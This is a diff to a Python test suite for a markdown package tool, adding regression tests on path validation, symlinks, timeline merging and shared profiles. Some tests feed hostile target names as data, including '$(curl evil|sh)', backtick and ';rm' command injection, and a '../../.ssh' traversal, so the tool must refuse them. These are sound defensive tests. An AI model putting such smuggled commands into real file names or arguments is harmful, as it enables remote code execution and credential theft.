@@ -72,7 +72,10 @@ DEP screens live under lib/dep/.
 
 class HeaderValidation(unittest.TestCase):
     def fields(self, **over):
-        return {k: str(v) for k, v in header(**over).items()}
+        fields = {k: str(v) for k, v in header(**over).items()}
+        if fields["kind"] == "feature":         # a feature header also names its ecosystem and members
+            fields.update(ecosystem="", feature="", members="")
+        return fields
 
     def test_each_kind_accepts_its_own_id(self):
         for kind, pid in (("project", "wikipetia@project"), ("ecosystem", "acme@ecosystem"),
@@ -196,7 +199,9 @@ class PackStaging(TempRoot):
     def test_feature_parts_are_staged_with_at_names(self):
         write(self.root, "@note.md", "# DEP\n")
         write(self.root, "@overview/acme-admin.md", "screens\n")
-        text = pkgformat.pack_staging(header(kind="feature", package="dep@acme"), self.root)
+        text = pkgformat.pack_staging(header(kind="feature", package="dep@acme"), self.root,
+                                      header_extra="ecosystem:\n  slug: acme\nfeature:\n  slug: dep\n"
+                                                   "members:\n  - {project: acme-admin, component: DEP}")
         _, sections = pkgformat.read_package(text)
         self.assertEqual([("note", ""), ("overview", "acme-admin")],
                          [(s.type, s.arg) for s in sections])
@@ -269,7 +274,7 @@ class Strip(unittest.TestCase):
     def test_drop_columns_agrees_with_health(self):
         for text in (GENERAL, MAP_TABLE, "no table\n"):
             self.assertEqual(pkgclean.drop_columns(text, pkgclean.MACHINE_COLUMNS, normalise=True)[0],
-                             health._drop_columns(text))
+                             health._drop_columns(text, "ecosystem/acme/map.md"))
 
     def test_normalise_ignores_cell_padding(self):
         a = "| A | B |\n|---|---|\n| 1 | 2 |\n"
@@ -288,7 +293,7 @@ class SeparatorRows(unittest.TestCase):
     def test_health_agrees_on_separator_rows(self):
         text = "| A | Local Path |\n| ------ | :--- |\n| 1 | /x |\n"
         self.assertEqual(pkgclean.drop_columns(text, pkgclean.MACHINE_COLUMNS, normalise=True)[0],
-                         health._drop_columns(text))
+                         health._drop_columns(text, "ecosystem/acme/map.md"))
 
     def test_reimport_after_local_path_readded_with_different_separator(self):
         import tempfile as _t
@@ -474,13 +479,13 @@ class Plan(TempRoot):
         self.assertEqual("unchanged", pkgstate.plan(self.root, h, s)[0].action)
 
     def test_rename_moves_targets_and_links(self):
-        h, s = pkg([Section("file", self.G, "# W\n"),
+        h, s = pkg([Section("file", self.G, "# W\n"), Section("file", "project-plans/active/a.md", "# A\n"),
                     Section("link", "project-management/w/Plans/a.md -> project-plans/active/a.md", "")])
         items = pkgstate.plan(self.root, h, s, {"project-management/w": "project-management/w2"})
-        self.assertEqual(["project-management/w2/General.md",
+        self.assertEqual(["project-management/w2/General.md", "project-plans/active/a.md",
                           "project-management/w2/Plans/a.md -> project-plans/active/a.md"],
                          [i.target for i in items])
-        self.assertEqual("link", items[1].action)
+        self.assertEqual("link", items[2].action)
 
     def test_feature_packages_are_refused(self):
         h, s = pkgformat.read_package(FORMAT1)
@@ -655,6 +660,181 @@ class ShareProfile(unittest.TestCase):
         self.assertEqual(["Pet Names"], self.unknown)
         self.assertIn("left blank in a shared profile", self.sections["Pet Names"])
         self.assertNotIn("calls me V", self.sections["Pet Names"])
+
+
+class ReviewFixes(TempRoot):
+    """Regression tests for the final whole-branch review, findings 1-8."""
+
+    # 1 — package text must never reach a shell
+    def test_shell_metacharacters_are_refused(self):
+        for target in ("project-plans/active/$(curl evil|sh).md", "project-plans/active/a`id`.md",
+                       'project-plans/active/a"b.md', "project-plans/active/a\nb.md",
+                       "project-plans/active/a;rm.md", "project-management/w/-rf.md",
+                       "project-plans/active/a|b.md"):
+            with self.assertRaises(PackageError, msg=repr(target)):
+                pkgstate.check_target("project", target)
+        with self.assertRaises(PackageError):
+            pkgstate.check_target("profile", "main/main-memory.md#$(id)")
+
+    def test_ordinary_names_still_pass(self):
+        pkgstate.check_target("project", "project-plans/active/staylokal-make-offer (v2).md")
+        pkgstate.check_target("profile", "main/main-memory.md#Identity & Relationship")
+        pkgstate.check_target("profile", "main/main-memory.md#{{USER_NAME}} Profile")
+
+    def test_link_command_creates_and_refuses_to_clobber(self):
+        h_sections = [Section("file", "project-plans/active/a.md", "# A\n"),
+                      Section("link", "project-management/w/Plans/a.md -> project-plans/active/a.md", "")]
+        pkgfile = write(self.root, "p.pkg.md", pkgformat.render(header(), h_sections))
+        dst = self.root / "dst"
+        write(dst, "project-plans/active/a.md", "# A\n")
+        r = subprocess.run([sys.executable, str(SCRIPTS / "pkgtool.py"), "link", str(pkgfile),
+                            "project-management/w/Plans/a.md", "--root", str(dst)],
+                           capture_output=True, text=True)
+        self.assertEqual(0, r.returncode, r.stderr)
+        link = dst / "project-management/w/Plans/a.md"
+        self.assertTrue(link.is_symlink())
+        self.assertEqual("# A\n", link.read_text())
+        link.unlink()
+        write(dst, "project-management/w/Plans/a.md", "my own file\n")
+        r = subprocess.run([sys.executable, str(SCRIPTS / "pkgtool.py"), "link", str(pkgfile),
+                            "project-management/w/Plans/a.md", "--root", str(dst)],
+                           capture_output=True, text=True)
+        self.assertEqual(1, r.returncode)
+        self.assertEqual("my own file\n", (dst / "project-management/w/Plans/a.md").read_text())
+
+    # 2 — dot and empty segments
+    def test_dot_and_empty_segments_are_refused(self):
+        for target in ("project-management/./_template/structure.yaml",
+                       "project-management//_template/structure.yaml",
+                       "project-plans/./active/a.md"):
+            with self.assertRaises(PackageError, msg=target):
+                pkgstate.check_target("project", target)
+        h, s = pkg([Section("file", "project-management/w/General.md", "g\n")])
+        with self.assertRaises(PackageError):
+            pkgstate.plan(self.root, h, s, {"project-management/w": "project-management/./_template"})
+
+    # 3 — links are scoped, classified, and never redirect writes
+    def test_link_must_live_in_plans_or_debugging_and_point_at_a_packaged_md(self):
+        for arg in ("project-management/w/General.md -> project-plans/active/a.md",
+                    "project-management/w/Plans/d -> project-management/",
+                    "project-management/w/Plans/a.md -> project-plans/active/missing.md"):
+            h, s = pkg([Section("file", "project-plans/active/a.md", "# A\n"), Section("link", arg, "")])
+            with self.assertRaises(PackageError, msg=arg):
+                pkgstate.plan(self.root, h, s)
+
+    def test_regular_file_at_link_path_is_a_conflict(self):
+        write(self.root, "project-management/w/Plans/a.md", "mine\n")
+        h, s = pkg([Section("file", "project-plans/active/a.md", "# A\n"),
+                    Section("link", "project-management/w/Plans/a.md -> project-plans/active/a.md", "")])
+        self.assertEqual("conflict", pkgstate.plan(self.root, h, s)[1].action)
+
+    def test_write_through_symlink_escaping_root_is_refused(self):
+        outside = tempfile.TemporaryDirectory()
+        self.addCleanup(outside.cleanup)
+        (self.root / "project-management" / "w").mkdir(parents=True)
+        (self.root / "project-management" / "w" / "Features").symlink_to(outside.name)
+        with self.assertRaisesRegex(PackageError, "outside"):
+            pkgstate.write_target(self.root, "project-management/w/Features/x.md", "x\n", kind="project")
+        self.assertEqual([], list(Path(outside.name).iterdir()))
+
+    # 4 — Location is machine-bound only in an ecosystem map
+    def test_location_column_counts_outside_the_map(self):
+        c = "project-management/w/Components.md"
+        v1 = "| Component | Location |\n|---|---|\n| api | services/api |\n"
+        write(self.root, c, v1)
+        pkgstate.record(self.root, "wikipetia@project", 1, "2026-10-10", [c])
+        write(self.root, c, v1.replace("services/api", "apps/api"))
+        h, s = pkg([Section("file", c, v1 + "\nMore.\n")], version=2)
+        self.assertEqual("conflict", pkgstate.plan(self.root, h, s)[0].action)
+
+    def test_location_column_still_ignored_in_the_map(self):
+        m = "ecosystem/acme/map.md"
+        v1 = "| Project | Location |\n|---|---|\n| api | → General.md |\n"
+        write(self.root, m, v1.replace("→ General.md", "~/code/api"))
+        h, s = pkg([Section("file", m, v1)], kind="ecosystem", package="acme@ecosystem")
+        self.assertEqual("unchanged", pkgstate.plan(self.root, h, s)[0].action)
+
+    def test_health_agrees_location_is_map_only(self):
+        t = "| A | Location |\n|---|---|\n| 1 | x |\n"
+        self.assertEqual(pkgstate.comparable(t, "project-management/w/Components.md"),
+                         health._drop_columns(t, "project-management/w/Components.md"))
+        self.assertEqual(pkgstate.comparable(t, "ecosystem/acme/map.md"),
+                         health._drop_columns(t, "ecosystem/acme/map.md"))
+
+    # 5 — same-date growth is surfaced, not swallowed
+    def test_same_date_different_body_is_reported(self):
+        t = "project-management/w/Timeline.md"
+        write(self.root, t, "# T\n\n## 2026-10-10\n- morning\n")
+        h, s = pkg([Section("file", t, "# T\n\n## 2026-10-10\n- morning\n- afternoon\n")])
+        item = pkgstate.plan(self.root, h, s)[0]
+        self.assertEqual("timeline-differs", item.action)
+        self.assertIn("2026-10-10", item.reason)
+
+    def test_new_dates_still_merge_and_mention_the_difference(self):
+        t = "project-management/w/Timeline.md"
+        write(self.root, t, "# T\n\n## 2026-10-10\n- morning\n")
+        h, s = pkg([Section("file", t, "# T\n\n## 2026-10-11\n- next\n\n## 2026-10-10\n- morning\n- afternoon\n")])
+        item = pkgstate.plan(self.root, h, s)[0]
+        self.assertEqual("merge-timeline", item.action)
+        self.assertIn("2026-10-10", item.reason)
+
+    # 6 — section replacement is positional
+    def test_section_replace_ignores_identical_text_in_a_subsection(self):
+        f = write(self.root, "main/main-memory.md",
+                  "# V\n\n## Prefs\n\n### Usage Notes\n\nkeep this\n\n## Usage Notes\n\nkeep this\n")
+        pkgstate.write_target(self.root, "main/main-memory.md#Usage Notes", "## Usage Notes\n\nnew\n")
+        self.assertEqual("# V\n\n## Prefs\n\n### Usage Notes\n\nkeep this\n\n## Usage Notes\n\nnew\n",
+                         f.read_text())
+
+    def test_duplicate_headings_resolve_to_the_first_everywhere(self):
+        text = "## A\none\n\n## A\ntwo\n"
+        self.assertEqual("## A\none\n", pkgstate.heading_sections(text)["A"])
+        self.assertEqual(health._heading_section(text, "A"), pkgstate.heading_sections(text)["A"])
+
+    # 7 — section content and audience are enforced
+    def test_section_content_must_be_exactly_its_heading(self):
+        for content in ("## Tips\nok\n\n## Communication Style\n\nINJECTED\n", "## Other\nwrong heading\n",
+                        "no heading at all\n"):
+            h, s = pkg([Section("section", "main/main-memory.md#Tips", content)],
+                       kind="profile", package="profile@shared", audience="share")
+            with self.assertRaises(PackageError, msg=content):
+                pkgstate.plan(self.root, h, s)
+
+    def test_share_packages_cannot_carry_personal_files(self):
+        for kind, package, target in (("profile", "profile@shared", "main/current-session.md"),
+                                      ("profile", "profile@shared", "main/session-archive.md"),
+                                      ("profile", "profile@shared", "main/projects-context.md"),
+                                      ("project", "w@project", "project-management/w/Timeline.md"),
+                                      ("project", "w@project", "project-management/w/Feedbacks/a.md")):
+            h, s = pkg([Section("file", target, "x\n")], kind=kind, package=package, audience="share")
+            with self.assertRaises(PackageError, msg=target):
+                pkgstate.plan(self.root, h, s)
+
+    # 8 — feature targets come from the tool, validated
+    def feature_pkg(self, members):
+        extra = ("ecosystem:\n  slug: acme\nfeature:\n  slug: dep\nmembers:\n" + members)
+        return pkgformat.render(header(kind="feature", package="dep@acme"),
+                                [Section("note", "", "# DEP\n")], header_extra=extra)
+
+    def test_feature_targets_are_derived_and_validated(self):
+        text = self.feature_pkg('  - {project: acme-admin, component: DEP, git_origin: "https://x/a.git"}\n')
+        self.assertEqual(
+            [("map", "ecosystem/acme/map.md"), ("note", "ecosystem/acme/features/dep.md"),
+             ("overview", "project-management/acme-admin/Features/DEP/Overview.md"),
+             ("components", "project-management/acme-admin/Components.md")],
+            pkgstate.feature_targets(text))
+
+    def test_feature_targets_refuse_hostile_members(self):
+        for members in ('  - {project: acme, component: "../../../../.ssh"}\n',
+                        '  - {project: "Bad Slug", component: DEP}\n',
+                        '  - {project: acme, component: "$(id)"}\n'):
+            with self.assertRaises(PackageError, msg=members):
+                pkgstate.feature_targets(self.feature_pkg(members))
+
+    def test_format_2_feature_needs_members(self):
+        text = pkgformat.render(header(kind="feature", package="dep@acme"), [])
+        with self.assertRaisesRegex(PackageError, "`members`|`ecosystem`|`feature`"):
+            pkgformat.read_package(text)
 
 
 class Cli(TempRoot):
